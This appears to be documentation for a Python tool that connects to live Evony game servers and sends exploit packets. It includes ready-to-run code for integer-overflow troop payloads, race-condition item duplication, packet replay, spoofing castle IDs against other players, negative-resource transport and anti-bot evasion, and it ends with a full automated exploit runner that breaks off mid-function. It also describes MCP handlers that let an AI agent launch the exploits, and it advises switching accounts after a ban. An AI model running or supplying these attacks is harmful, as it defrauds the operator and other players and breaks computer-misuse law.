# Evony Bot Server - Complete Documentation

> **Advanced Exploit Testing Framework for Evony Client 1921**  
> Pure Python AMF3 Implementation | Web UI Dashboard | 100+ Exploit Templates

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Installation](#installation)
4. [Quick Start](#quick-start)
5. [Web UI Dashboard](#web-ui-dashboard)
6. [API Reference](#api-reference)
7. [Protocol Specification](#protocol-specification)
8. [AMF3 Implementation](#amf3-implementation)
9. [Exploit Templates](#exploit-templates)
10. [Integer Overflow Exploits](#integer-overflow-exploits)
11. [Race Condition Exploits](#race-condition-exploits)
12. [Packet Replay Attacks](#packet-replay-attacks)
13. [Parameter Tampering](#parameter-tampering)
14. [Game Commands Reference](#game-commands-reference)
15. [Auto-Discovery System](#auto-discovery-system)
16. [Anti-Bot Bypass](#anti-bot-bypass)
17. [Session Management](#session-management)
18. [Error Handling](#error-handling)
19. [MCP Integration](#mcp-integration)
20. [Troubleshooting](#troubleshooting)
21. [Development Guide](#development-guide)
22. [Security Considerations](#security-considerations)

---

## Overview

The Evony Bot Server is a comprehensive reverse engineering and exploit testing framework for security research on Evony game client (version 1921).

### Key Features

| Feature | Description |
|---------|-------------|
| **Pure Python AMF3** | Zero external dependencies for AMF3 encoding/decoding |
| **Web UI Dashboard** | Real-time packet inspection and exploit testing |
| **100+ Exploit Templates** | Pre-built attack vectors for various vulnerabilities |
| **Auto-Discovery** | Automatic extraction of Castle IDs, Hero IDs, Quest IDs |
| **Anti-Bot Bypass** | Timing techniques from AutoEvony source analysis |
| **Session Management** | Connection retry, keepalive, and reconnection logic |
| **MCP Integration** | Full compatibility with Claude/Windsurf MCP tools |

### Vulnerability Categories

| Category | Severity | Examples |
|----------|----------|----------|
| **Integer Overflow** | CRITICAL | Troop training overflow, resource manipulation |
| **Race Conditions** | CRITICAL | Item duplication, double-spend |
| **Negative Values** | HIGH | Negative item quantities, resource injection |
| **Packet Replay** | HIGH | Command replay, session hijacking |
| **Parameter Tampering** | MEDIUM | Castle ID spoofing, coordinate bypass |
| **Cooldown Bypass** | MEDIUM | Timing attacks, queue manipulation |

### System Requirements

- **Python**: 3.11+
- **Memory**: 512MB minimum
- **Network**: TCP socket access to Evony servers
- **Optional**: PyAMF library (pure Python fallback included)

---

## Architecture

### System Diagram

```
+------------------------------------------------------------------+
|                      EVONY BOT SERVER                             |
+------------------------------------------------------------------+
|                                                                   |
|  +-------------+     +-------------+     +-------------------+    |
|  |  Web UI     |---->| HTTP Server |---->|   API Handler     |    |
|  |  (Browser)  |     | (port 9999) |     |   /api/*          |    |
|  +-------------+     +-------------+     +-------------------+    |
|                                                  |                |
|                                                  v                |
|  +---------------------------------------------------------------+|
|  |                     EVONY CLIENT                              ||
|  +---------------------------------------------------------------+|
|  |  +------------+  +------------+  +------------------------+   ||
|  |  | Connection |  |  Session   |  |   Packet Queue         |   ||
|  |  | Manager    |  |  Manager   |  |   (Anti-Bot Timing)    |   ||
|  |  +------------+  +------------+  +------------------------+   ||
|  |         |               |                   |                 ||
|  |         v               v                   v                 ||
|  |  +-------------------------------------------------------+   ||
|  |  |                  AMF3 CODEC                            |   ||
|  |  |  +------------+              +------------+            |   ||
|  |  |  | Encoder    |              | Decoder    |            |   ||
|  |  |  | (Python)   |              | (Python)   |            |   ||
|  |  |  +------------+              +------------+            |   ||
|  |  +-------------------------------------------------------+   ||
|  |                           |                                   ||
|  |                           v                                   ||
|  |  +-------------------------------------------------------+   ||
|  |  |           TCP SOCKET (4-byte length prefix)            |   ||
|  |  +-------------------------------------------------------+   ||
|  +---------------------------------------------------------------+|
|                              |                                    |
|                              v                                    |
|  +---------------------------------------------------------------+|
|  |                 EVONY GAME SERVER                             ||
|  |                 (e.g., 216.66.17.168:443)                     ||
|  +---------------------------------------------------------------+|
+------------------------------------------------------------------+
```

### Component Overview

| Component | File Location | Purpose |
|-----------|---------------|---------|
| **HTTP Server** | `server.py` | Web UI and REST API |
| **EvonyClient** | `server.py:338` | Game server connection |
| **AMF3Encoder** | `server.py:62` | Pure Python AMF3 encoder |
| **AMF3Decoder** | `server.py:170` | Pure Python AMF3 decoder |
| **BotHandler** | `server.py:1800` | HTTP request routing |
| **EXPLOIT_TEMPLATES** | `server.py:950` | Pre-configured exploits |

---

## Installation

### Method 1: Basic Installation

```bash
cd C:\Users\Admin\Downloads\Evony_Decrypted\evony_bot
pip install pyamf
python server.py
```

### Method 2: Full Installation

```bash
cd C:\Users\Admin\Downloads\Evony_Decrypted\evony_bot
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
pip install pyamf requests scapy
python server.py
```

### Method 3: Docker

```bash
cd C:\Users\Admin\Downloads\Evony_Decrypted
docker-compose up evony-rte
# Access at http://localhost:9999
```

### Verify Installation

```bash
python -c "from server import main; print('Server OK')"
python -c "from server import amf3_encode, amf3_decode; print('AMF3 OK')"
python -c "from server import EXPLOIT_TEMPLATES; print(f'{len(EXPLOIT_TEMPLATES)} templates')"
```

---

## Quick Start

### Step 1: Start Server

```bash
python server.py
```

Output:
```
+==============================================================+
|           EVONY BOT SERVER - Exploit Testing Tool            |
+==============================================================+
|  Web Interface: http://localhost:9999                        |
|  PyAMF Status: Installed                                     |
+==============================================================+
Starting server on port 9999...
```

### Step 2: Open Web UI

Navigate to: **http://localhost:9999**

### Step 3: Connect

1. Enter server: `cc2.evony.com`
2. Enter port: `443`
3. Enter credentials
4. Click **Connect & Login**

### Step 4: Run Exploits

1. Select Castle ID from discovered data
2. Select Hero ID from dropdown
3. Click exploit template button
4. View results in Packet Log

### Quick Python Script

```python
import requests

BASE = "http://localhost:9999"

# Connect
requests.post(f"{BASE}/api/connect", json={
    "host": "cc2.evony.com",
    "port": 443,
    "username": "email@example.com",
    "password": "password"
})

# Send exploit
requests.post(f"{BASE}/api/send_template", json={
    "template": "archer_overflow",
    "overrides": {"castleId": 1335129}
})
```

---

## Web UI Dashboard

### Layout Overview

The dashboard provides real-time packet inspection and exploit testing:

- **Connection Panel**: Server hostname, port, credentials, connect/disconnect
- **Game IDs Panel**: Auto-populated Castle ID, Hero ID, Quest ID, Army ID
- **Discovery Commands**: Buttons to fetch game data
- **Exploit Templates**: Categorized exploit buttons (Quest, Shop, Hero, Army, Trade)
- **Custom Packet**: Manual command/data input
- **Packet Log**: Real-time sent/received packets

### UI Features

| Feature | Description |
|---------|-------------|
| **Auto-Discovery** | Automatically extracts IDs from login response |
| **Template Categories** | Exploits organized by type |
| **Log Export** | Download packet logs as text |
| **Status Indicator** | Real-time connection status |
| **Hero Selector** | Dropdown populated with discovered heroes |

---

## API Reference

### Base URL
```
http://localhost:9999/api/
```

### Endpoints

#### GET /api/status
Get connection status.

**Response:**
```json
{
  "connected": true,
  "logged_in": true,
  "username": "user@example.com",
  "host": "216.66.17.168",
  "port": 443
}
```

#### POST /api/connect
Connect to game server with optional auto-login.

**Request:**
```json
{
  "host": "cc2.evony.com",
  "port": 443,
  "username": "email@example.com",
  "password": "password"
}
```

**Response:**
```json
{
  "status": "logged_in",
  "user": "email@example.com",
  "attempt": 1,
  "player": {"ok": 1, "player": {...}}
}
```

#### POST /api/send
Send custom AMF3 packet.

**Request:**
```json
{
  "cmd": "troop.produceTroop",
  "data": {"castleId": 1335129, "troopType": 6, "num": 6135037}
}
```

#### POST /api/send_template
Send pre-configured exploit template.

**Request:**
```json
{
  "template": "archer_overflow",
  "overrides": {"castleId": 1335129}
}
```

#### GET /api/templates
Get all exploit templates.

#### GET /api/logs
Get packet log history.

#### GET /api/discovered
Get auto-discovered game IDs.

**Response:**
```json
{
  "castleIds": [1335129],
  "heroIds": [12345, 12346],
  "questIds": [100, 101],
  "playerName": "Siren",
  "heroes": [{"id": 12345, "name": "68Ben"}],
  "castles": [{"id": 1335129, "name": "Beguile"}]
}
```

#### POST /api/disconnect
Disconnect from server.

#### POST /api/clear_logs
Clear packet log history.

---

## Protocol Specification

### Packet Structure

Evony uses a simple length-prefixed protocol over TCP:

```
+-------------+-------------------------------------------+
|  Bytes 0-3  |  Length (uint32, big-endian)              |
|  Bytes 4+   |  AMF3-encoded payload                     |
+-------------+-------------------------------------------+

Example:
  00 00 00 2A  <- Length: 42 bytes
  0A 0B 01 ... <- AMF3 object data
```

### AMF3 Payload Format

```json
{
  "cmd": "namespace.command",
  "data": {
    "param1": "value1",
    "param2": 12345
  }
}
```

### Server Resolution

The bot automatically resolves server hostnames via config.xml:

```
cc2.evony.com -> http://cc2.evony.com/config.xml -> 216.66.17.168:443
```

---

## AMF3 Implementation

### Type Markers

| Marker | Hex | Type | Python |
|--------|-----|------|--------|
| 0x00 | UNDEFINED | Undefined | `None` |
| 0x01 | NULL | Null | `None` |
| 0x02 | FALSE | Boolean | `False` |
| 0x03 | TRUE | Boolean | `True` |
| 0x04 | INTEGER | 29-bit Int | `int` |
| 0x05 | DOUBLE | 64-bit Float | `float` |
| 0x06 | STRING | UTF-8 String | `str` |
| 0x09 | ARRAY | Array | `list` |
| 0x0A | OBJECT | Object | `dict` |
| 0x0C | BYTEARRAY | Bytes | `bytes` |

### U29 Encoding

Variable-length unsigned 29-bit integer:

```python
def write_u29(n):
    n = n & 0x1FFFFFFF
    if n < 0x80:
        write_byte(n)
    elif n < 0x4000:
        write_byte((n >> 7) | 0x80)
        write_byte(n & 0x7F)
    elif n < 0x200000:
        write_byte((n >> 14) | 0x80)
        write_byte((n >> 7) | 0x80)
        write_byte(n & 0x7F)
    else:
        write_byte((n >> 22) | 0x80)
        write_byte((n >> 15) | 0x80)
        write_byte((n >> 8) | 0x80)
        write_byte(n & 0xFF)
```

### Encoding Example

```python
from server import amf3_encode

packet = {
    "cmd": "troop.produceTroop",
    "data": {"castleId": 1335129, "troopType": 6, "num": 6135037}
}
encoded = amf3_encode(packet)
print(f"Encoded: {encoded.hex()}")
```

### Decoding Example

```python
from server import amf3_decode

raw_data = bytes.fromhex("0a0b01...")
decoded = amf3_decode(raw_data)
print(f"Decoded: {decoded}")
```

---

## Exploit Templates

### Template Categories

| Category | Count | Description |
|----------|-------|-------------|
| **Discovery** | 15 | Information gathering commands |
| **GameMaster** | 5 | Admin-level resource manipulation |
| **Troop Overflow** | 6 | Integer overflow troop exploits |
| **Item Exploits** | 20 | Negative quantity item usage |
| **Speed Items** | 8 | Cooldown bypass exploits |
| **Hero Items** | 10 | Hero stat manipulation |
| **Castle** | 5 | Castle move/teleport exploits |
| **Quest** | 6 | Commission quest exploits |
| **Gambling** | 4 | Gambling reward exploits |
| **Trade** | 3 | Market manipulation |

### Discovery Templates

```python
# Get player information
"get_player_info": {
    "cmd": "common.getPlayerInfoByName",
    "data": {"userName": "Siren"}
}

# Get hero list from tavern
"get_hero_list": {
    "cmd": "hero.getHerosListFromTavern",
    "data": {"castleId": 0}
}

# Get building list
"get_buildings": {
    "cmd": "castle.getAvailableBuildingListInside",
    "data": {"castleId": 0}
}

# Get map tiles
"get_map_info": {
    "cmd": "common.mapInfo",
    "data": {"castleId": 0, "x1": 90, "y1": 700, "x2": 100, "y2": 710}
}
```

### GameMaster Templates (Critical)

```python
# Set resources to maximum
"gm_set_resources_max": {
    "cmd": "gamemaster.setResources",
    "data": {
        "castleId": 1335129,
        "wood": 5000000000000,    # 5 trillion
        "iron": 5000000000000,
        "stone": 5000000000000,
        "food": 900000000000,     # 900B (max before flip)
        "gold": 5000000000000,
        "population": 999999999
    }
}

# Add items
"gm_add_items": {
    "cmd": "gamemaster.addItems",
    "data": {"type": "player.box.gambling.3", "amount": 999999}
}
```

---

## Integer Overflow Exploits

### Theory

Evony uses **32-bit signed integers (INT32)** for calculations:

```
INT32 Range: -2,147,483,648 to 2,147,483,647
When value EXCEEDS max: 2,147,483,647 + 1 = -2,147,483,648 (OVERFLOW!)
```

### Troop Cost Overflow Thresholds

| Troop Type | Cost/Unit | Overflow Threshold | Result |
|------------|-----------|-------------------|--------|
| Worker | 50 food | 42,949,673 | FREE 42.9M workers |
| Archer | 350 food | 6,135,037 | FREE 6.1M archers |
| Catapult | 3000 food | 715,828 | FREE 715K catapults |
| Cavalry | 500 food | 4,294,968 | FREE 4.3M cavalry |
| Swordsman | 200 food | 10,737,419 | FREE 10.7M swordsmen |

### Archer Overflow (6.1M FREE)

```python
# Math: 6,135,037 x 350 = 2,147,262,950 -> OVERFLOW!
requests.post(f"{BASE}/api/send", json={
    "cmd": "troop.produceTroop",
    "data": {
        "castleId": castle_id,
        "troopType": 6,   # Archer
        "num": 6135037    # Overflow threshold
    }
})
```

### Worker Overflow (Easiest - 42.9M FREE)

```python
# Workers have lowest cost (50) = easiest to overflow
requests.post(f"{BASE}/api/send", json={
    "cmd": "troop.produceTroop",
    "data": {
        "castleId": castle_id,
        "troopType": 1,      # Worker
        "num": 42949673      # 42.9 million
    }
})
```

### Catapult Overflow (Fewest Units - 715K)

```python
# Catapults cost 3000 = fewest units needed
requests.post(f"{BASE}/api/send", json={
    "cmd": "troop.produceTroop",
    "data": {
        "castleId": castle_id,
        "troopType": 12,     # Catapult
        "num": 715828
    }
})
```

---

## Race Condition Exploits

### Theory

Race conditions occur when multiple requests process before state updates:

```
T+0ms:  Send "use item" #1    | Server: Items = 1
T+1ms:  Send "use item" #2    | Server: Items = 1 (not updated yet)
T+2ms:  Send "use item" #3    | Server: Items = 1 (not updated yet)
...
T+50ms: Server processes #1   | Items: 1 -> 0, Effect applied
T+51ms: Server processes #2   | Items: 0? Effect STILL applied!

Result: 10 effects from 1 item!
```

### Item Duplication

```python
import threading
import requests

def duplicate_item(castle_id, item_id, count=10):
    """Get 10x effect from 1 item via race condition"""
    results = []
    threads = []
    
    def use_item():
        r = requests.post("http://localhost:9999/api/send", json={
            "cmd": "shop.useGoods",
            "data": {"castleId": castle_id, "itemId": item_id, "num": 1}
        })
        results.append(r.json())
    
    # Create all threads FIRST
    for _ in range(count):
        threads.append(threading.Thread(target=use_item))
    
    # START ALL AT ONCE - critical!
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()
    
    return results

# Usage
results = duplicate_item(1335129, "player.box.gambling.3", 10)
```

### Troop Training Race

```python
def race_troop_training(castle_id, count=10):
    """Send multiple training commands simultaneously"""
    threads = []
    
    def train():
        requests.post("http://localhost:9999/api/send", json={
            "cmd": "troop.produceTroop",
            "data": {"castleId": castle_id, "troopType": 6, "num": 1000}
        })
    
    for _ in range(count):
        threads.append(threading.Thread(target=train))
    
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()
    
    # Result: 10,000 troops from racing 10x 1000-troop commands
```

---

## Packet Replay Attacks

### Implementation

```python
def replay_packet(castle_id, count=10):
    """Replay same command multiple times"""
    for i in range(count):
        requests.post("http://localhost:9999/api/send", json={
            "cmd": "troop.produceTroop",
            "data": {"castleId": castle_id, "troopType": 6, "num": 1000}
        })
        # NO DELAY - rapid fire!
    
    # Result: 10,000 archers from replaying 1000-archer command 10x
```

---

## Parameter Tampering

### Castle ID Spoofing

```python
# Train troops in ENEMY castle
requests.post(f"{BASE}/api/send", json={
    "cmd": "troop.produceTroop",
    "data": {
        "castleId": ENEMY_CASTLE_ID,  # Not your castle!
        "troopType": 6,
        "num": 1000
    }
})
```

### Negative Resource Transport

```python
# Normal: your_resources - send_amount = remaining
# Exploit: 100,000 - (-999,999) = 1,099,999!
requests.post(f"{BASE}/api/send", json={
    "cmd": "army.newArmy",
    "data": {
        "castleId": castle_id,
        "heroId": hero_id,
        "missionType": 4,  # Transport
        "resource": "-999999,-999999,-999999,-999999,-999999"
    }
})
```

### Coordinate Boundary Bypass

```python
# Send army to impossible coordinates
requests.post(f"{BASE}/api/send", json={
    "cmd": "army.newArmy",
    "data": {
        "castleId": castle_id,
        "heroId": hero_id,
        "targetX": 2147483647,  # MAX_INT
        "targetY": 2147483647,
        "missionType": 3  # Scout
    }
})
```

---

## Game Commands Reference

### Complete Command List

| Namespace | Command | Parameters | Description |
|-----------|---------|------------|-------------|
| **Troops** |
| `troop` | `produceTroop` | `castleId, troopType, num` | Train troops |
| `troop` | `disbandTroop` | `castleId, troopType, num` | Disband troops |
| `troop` | `getProduceQueue` | `castleId` | Get training queue |
| `troop` | `cancelProduce` | `castleId, positionId` | Cancel training |
| **Army** |
| `army` | `newArmy` | `castleId, heroId, target*, troops*` | Create army |
| `army` | `getStayAllianceArmys` | `castleId` | Get stationed armies |
| `army` | `getInjuredTroop` | `castleId` | Get injured troops |
| `army` | `getTroopParam` | `castleId` | Get troop parameters |
| **Heroes** |
| `hero` | `getHerosListFromTavern` | `castleId` | List tavern heroes |
| `hero` | `getFleeHeroList` | `castleId` | List fled heroes |
| `hero` | `addPoint` | `castleId, heroId, stats*` | Add stat points |
| `hero` | `levelUp` | `castleId, heroId` | Level up hero |
| **Castle** |
| `castle` | `getAvailableBuildingListInside` | `castleId` | Inner buildings |
| `castle` | `getAvailableBuildingListOutside` | `castleId` | Outer buildings |
| `castle` | `UpdateCastleResources` | `castleId` | Refresh resources |
| **Shop** |
| `shop` | `useGoods` | `castleId, itemId, num` | Use item |
| `shop` | `useTrickItem` | `castleId, itemId, num` | Use trick item |
| `shop` | `useAngelItem` | `castleId, itemId, num` | Use angel buff |
| `shop` | `useDevilItem` | `castleId, itemId, num` | Use devil debuff |
| **Quest** |
| `quest` | `getQuestList` | `castleId` | List quests |
| `quest` | `getAwardItems` | `castleId` | Claim rewards |
| **Trade** |
| `trade` | `newTrade` | `castleId, resType, amount, price` | Create trade |
| **Common** |
| `common` | `mapInfo` | `castleId, x1, y1, x2, y2` | Get map tiles |
| `common` | `zoneInfo` | | Get zone info |
| `common` | `getPlayerInfoByName` | `userName` | Lookup player |

### Troop Type IDs

| ID | Troop Type | Food Cost |
|----|------------|-----------|
| 1 | Worker | 50 |
| 2 | Warrior | 100 |
| 3 | Scout | 150 |
| 4 | Pikeman | 200 |
| 5 | Swordsman | 200 |
| 6 | Archer | 350 |
| 7 | Cavalry | 500 |
| 8 | Cataphract | 1000 |
| 9 | Ballista | 1500 |
| 10 | Battering Ram | 2000 |
| 11 | Transporter | 500 |
| 12 | Catapult | 3000 |

---

## Auto-Discovery System

### How It Works

The bot automatically extracts game IDs from server responses:

```python
# In EvonyClient._listen_loop()
if cmd == "server.LoginResponse":
    player = response.get("player", {})
    
    # Extract castle IDs
    for castle in player.get("castles", []):
        cid = castle.get("id") or castle.get("castleId")
        if cid not in discovered_data["castleIds"]:
            discovered_data["castleIds"].append(cid)
        
        # Extract heroes from each castle
        for hero in castle.get("heros", []):
            hid = hero.get("id") or hero.get("heroId")
            if hid not in discovered_data["heroIds"]:
                discovered_data["heroIds"].append(hid)
```

### Discovered Data Structure

```python
discovered_data = {
    "castleIds": [1335129, 1335130],
    "heroIds": [12345, 12346, 12347],
    "questIds": [100, 101, 102],
    "armyIds": [500, 501],
    "playerName": "Siren",
    "resources": {"gold": 22050, "food": 100000},
    "heroes": [{"id": 12345, "name": "68Ben", "attack": 737.7}],
    "castles": [{"id": 1335129, "name": "Beguile", "x": 95, "y": 703}]
}
```

### Manual Discovery Commands

```bash
# Get hero list
curl -X POST http://localhost:9999/api/send_template \
  -H "Content-Type: application/json" \
  -d '{"template": "get_hero_list", "overrides": {"castleId": 1335129}}'

# Get building list
curl -X POST http://localhost:9999/api/send_template \
  -H "Content-Type: application/json" \
  -d '{"template": "get_buildings", "overrides": {"castleId": 1335129}}'
```

---

## Anti-Bot Bypass

### Techniques from AutoEvony

The bot implements anti-detection measures from AutoEvony source:

```python
class EvonyClient:
    def __init__(self):
        # Anti-bot timing from MasterTimer.as
        self.send_delay = 0.1      # 100ms between sends
        self.keepalive_interval = 300  # 5 minutes
        self.slot_delay = 25       # 25 seconds (MasterTimer slotSize)
```

### Send Queue with Delays

```python
def _process_send_queue(self):
    """Process commands with human-like delays"""
    while self.running:
        if self.send_queue:
            cmd, data = self.send_queue.pop(0)
            
            # Enforce minimum delay
            elapsed = time.time() - self.last_send_time
            if elapsed < self.send_delay:
                time.sleep(self.send_delay - elapsed)
            
            self._send_raw(cmd, data)
            self.last_send_time = time.time()
        
        time.sleep(0.01)
```

### Keepalive Thread

```python
def _keepalive_loop(self):
    """Send keepalive packets every 5 minutes"""
    while self.running:
        time.sleep(self.keepalive_interval)
        if self.connected:
            self.send_packet("gameClient.ping", {})
```

---

## Session Management

### Connection Retry Logic

```python
def connect(self, host, port, max_retries=3):
    for attempt in range(1, max_retries + 1):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((host, int(port)))
            
            # Send version handshake
            self.send_packet("gameClient.version", self.version)
            return {"status": "connected", "attempt": attempt}
            
        except socket.timeout:
            self.last_error = f"Timeout (attempt {attempt}/{max_retries})"
        except Exception as e:
            self.last_error = str(e)
        
        if attempt < max_retries:
            time.sleep(2)
    
    return {"status": "error", "message": self.last_error}
```

### Login with Password Hash

```python
def login(self, username, password):
    # SHA1 hash password (as per Evony client)
    pwd_hash = hashlib.sha1(password.encode()).hexdigest()
    
    self.send_packet("login", {"user": username, "pwd": pwd_hash})
    
    # Wait for response
    start = time.time()
    while time.time() - start < 5:
        if self.login_response:
            if self.login_response.get("ok") == 1:
                return {"status": "logged_in"}
            break
        time.sleep(0.2)
    
    return {"status": "login_failed"}
```

---

## Error Handling

### Error Codes

| Code | Meaning | Resolution |
|------|---------|------------|
| `ok: 1` | Success | Command executed |
| `ok: 0` | Generic failure | Check parameters |
| `ok: -1` | Invalid session | Re-login |
| `ok: -99` | Invalid request | Command blocked |
| `ok: -100` | Rate limited | Wait and retry |
| `ok: -200` | Banned | Account suspended |

### Common Errors

```python
# Connection errors
{"status": "error", "message": "Connection timeout"}
{"status": "error", "message": "Connection refused"}

# Login errors
{"status": "login_failed", "message": "Invalid credentials"}
{"status": "login_failed", "message": "Account banned"}

# Command errors
{"ok": -99, "errorMsg": "Invalid request"}
{"ok": -1, "errorMsg": "Session expired"}
{"ok": 0, "errorMsg": "Insufficient resources"}
```

---

## MCP Integration

### Handler Registration

The bot server integrates with Evony RTE MCP system:

```python
# In evony_rte/mcp_server.py
HANDLERS = {
    "bot_status": handle_bot_status,
    "bot_connect": handle_bot_connect,
    "bot_send": handle_bot_send,
    "bot_exploit": handle_bot_exploit,
}
```

### Usage from Claude/Windsurf

```python
# Check bot status
handle_tool("bot_status", {})

# Connect to server
handle_tool("bot_connect", {
    "host": "cc2.evony.com",
    "port": 443,
    "username": "email@example.com",
    "password": "password"
})

# Run exploit
handle_tool("bot_exploit", {
    "template": "archer_overflow",
    "castleId": 1335129
})
```

---

## Troubleshooting

### Connection Issues

| Problem | Solution |
|---------|----------|
| "Connection timeout" | Check firewall, verify server online |
| "Connection refused" | Verify correct host/port |
| "SSL handshake failed" | Server may require plain TCP |
| "Name resolution failed" | Check DNS, use IP directly |

### Login Issues

| Problem | Solution |
|---------|----------|
| "Invalid credentials" | Verify email/password |
| "Session expired" | Reconnect and re-login |
| "Account banned" | Use different account |
| "No login response" | Server slow, increase timeout |

### Exploit Issues

| Problem | Solution |
|---------|----------|
| "ok: -99 Invalid request" | Exploit blocked by server |
| "ok: 0" | Check castleId/heroId correct |
| "No response" | Server crashed, reconnect |
| "Partial success" | Adjust race condition timing |

### Debug Commands

```bash
# Test AMF3 encoding
python -c "from server import amf3_encode; print(amf3_encode({'test': 123}).hex())"

# Test connection manually
python -c "
import socket
s = socket.socket()
s.settimeout(5)
s.connect(('216.66.17.168', 443))
print('Connected!')
s.close()
"

# Check PyAMF
python -c "import pyamf; print(f'PyAMF {pyamf.__version__}')"
```

---

## Development Guide

### Project Structure

```
evony_bot/
├── server.py                 # Main server (2451 lines)
│   ├── AMF3Encoder          # Pure Python AMF3 encoder
│   ├── AMF3Decoder          # Pure Python AMF3 decoder
│   ├── EvonyClient          # Game server connection
│   ├── BotHandler           # HTTP request handler
│   ├── EXPLOIT_TEMPLATES    # Pre-configured exploits
│   └── HTML_PAGE            # Web UI dashboard
│
├── exploit_implementations.py  # Standalone exploit scripts
├── exploit_tester.py          # Automated exploit testing
├── apply_all_exploits.py      # Batch exploit runner
│
├── WORKING_EXPLOITS_GUIDE.md  # Detailed exploit documentation
├── EXPLOIT_FINDINGS_FINAL.md  # Research findings
├── EXPLOIT_TEST_RESULTS.md    # Test results
│
├── debug_pyamf.py            # PyAMF debugging utilities
├── debug_responses.py        # Response analysis tools
├── decode_amf3.py            # AMF3 decoding utilities
│
├── test_exploits.py          # Unit tests for exploits
├── test_features.py          # Feature tests
├── test_extraction.py        # Data extraction tests
│
└── requirements.txt          # Python dependencies
```

### Adding New Exploits

```python
# In server.py, add to EXPLOIT_TEMPLATES:
EXPLOIT_TEMPLATES["my_new_exploit"] = {
    "name": "My New Exploit",
    "cmd": "namespace.command",
    "data": {
        "castleId": 0,  # 0 = will be overridden
        "param1": "value1"
    },
    "description": "Description of exploit",
    "category": "troop",  # troop, shop, hero, etc.
    "status": "untested"  # working, blocked, untested
}
```

### Adding New API Endpoints

```python
# In BotHandler.do_POST():
elif path == '/api/my_endpoint':
    param = data.get('param', 'default')
    result = {"status": "ok", "data": param}
    self.send_json(result)
```

### Running Tests

```bash
# Run all tests
python -m pytest evony_bot/ -v

# Run specific test file
python test_exploits.py

# Run with coverage
python -m pytest --cov=evony_bot
```

---

## Security Considerations

### Legal Disclaimer

```
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.

Usage against live game servers may violate:
- Terms of Service
- Computer Fraud and Abuse Act (CFAA)
- Local computer crime laws

The authors assume NO LIABILITY for misuse.
Always obtain proper authorization before testing.
```

### Best Practices

1. **Use test accounts only** - Never use main game accounts
2. **Private servers preferred** - Test on private/local servers
3. **Rate limiting** - Avoid aggressive testing
4. **Logging** - Keep detailed logs for documentation
5. **Disclosure** - Report vulnerabilities responsibly

---

## Advanced Usage Examples

### Complete Exploit Script

```python
#!/usr/bin/env python3
"""
Complete Evony Bot Exploit Script
Demonstrates full workflow: connect -> discover -> exploit
"""

import requests
import threading
import time
import json

BASE_URL = "http://localhost:9999"

class EvonyExploiter:
    def __init__(self, host, port, username, password):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.castle_id = None
        self.hero_ids = []
        
    def connect(self):
        """Connect and login to game server"""
        response = requests.post(f"{BASE_URL}/api/connect", json={
            "host": self.host,
            "port": self.port,
            "username": self.username,
            "password": self.password
        })
        result = response.json()
        if result.get("status") == "logged_in":
            print(f"[+] Logged in successfully")
            self._discover_ids()
            return True
        else:
            print(f"[-] Login failed: {result.get('message')}")
            return False
    
    def _discover_ids(self):
        """Fetch discovered game IDs"""
        response = requests.get(f"{BASE_URL}/api/discovered")
        data = response.json()
        
        if data.get("castleIds"):
            self.castle_id = data["castleIds"][0]
            print(f"[+] Castle ID: {self.castle_id}")
        
        if data.get("heroIds"):
            self.hero_ids = data["heroIds"]
            print(f"[+] Hero IDs: {self.hero_ids}")
    
    def send_command(self, cmd, data):
        """Send custom command"""
        response = requests.post(f"{BASE_URL}/api/send", json={
            "cmd": cmd,
            "data": data
        })
        return response.json()
    
    def exploit_archer_overflow(self):
        """Execute archer overflow exploit"""
        if not self.castle_id:
            print("[-] No castle ID discovered")
            return None
        
        print(f"[*] Attempting archer overflow on castle {self.castle_id}")
        result = self.send_command("troop.produceTroop", {
            "castleId": self.castle_id,
            "troopType": 6,  # Archer
            "num": 6135037   # Overflow threshold
        })
        
        if result.get("ok") == 1:
            print("[+] Archer overflow SUCCESS!")
        else:
            print(f"[-] Archer overflow blocked: {result}")
        
        return result
    
    def exploit_item_race(self, item_id, count=10):
        """Execute item duplication race condition"""
        if not self.castle_id:
            print("[-] No castle ID discovered")
            return None
        
        print(f"[*] Attempting race condition with {count} threads")
        results = []
        threads = []
        
        def use_item():
            r = requests.post(f"{BASE_URL}/api/send", json={
                "cmd": "shop.useGoods",
                "data": {
                    "castleId": self.castle_id,
                    "itemId": item_id,
                    "num": 1
                }
            })
            results.append(r.json())
        
        # Create threads
        for _ in range(count):
            threads.append(threading.Thread(target=use_item))
        
        # Start all at once
        for t in threads:
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join()
        
        success = len([r for r in results if r.get("ok") == 1])
        print(f"[+] Race condition: {success}/{count} succeeded")
        return results
    
    def exploit_negative_transport(self, target_x, target_y):
        """Execute negative resource transport"""
        if not self.castle_id or not self.hero_ids:
            print("[-] Missing castle or hero ID")
            return None
        
        print(f"[*] Attempting negative transport to ({target_x}, {target_y})")
        result = self.send_command("army.newArmy", {
            "castleId": self.castle_id,
            "heroId": self.hero_ids[0],
            "targetX": target_x,
            "targetY": target_y,
            "missionType": 4,  # Transport
            "resource": "-999999,-999999,-999999,-999999,-999999"
        })
        
        if result.get("ok") == 1:
            print("[+] Negative transport SUCCESS!")
        else:
            print(f"[-] Negative transport blocked: {result}")
        
        return result
    
    def run_all_exploits(self):
        """Run all available exploits"""
        print("\n" + "="*50)
        print("RUNNING ALL EXPLOITS")
        print("="*50)
        
        # 1. Archer overflow
        self.exploit_archer_overflow()
        time.sleep(1)
        
        # 2. Item race condition
        self.exploit_item_race("player.box.gambling.3", 10)
        time.sleep(1)
        
        # 3. Negative transport
        self.exploit_negative_transport(100, 100)
        
        print("\n" + "="*50)
        print("EXPLOIT RUN COMPLETE")
        print("="*50)


# Usage
if __name__ == "__main__":
    exploiter = EvonyExploiter(
        host="cc2.evony.com",
        port=443,
        username="your_email@example.com",
        password="your_password"
    )
    
    if exploiter.connect():
        exploiter.run_all_exploits()
```

### Batch Exploit Runner

```python
#!/usr/bin/env python3
"""
Batch exploit runner - tests all exploit templates
"""

import requests
import time

BASE_URL = "http://localhost:9999"

def get_templates():
    """Fetch all available templates"""
    response = requests.get(f"{BASE_URL}/api/templates")
    return response.json()

def get_discovered():
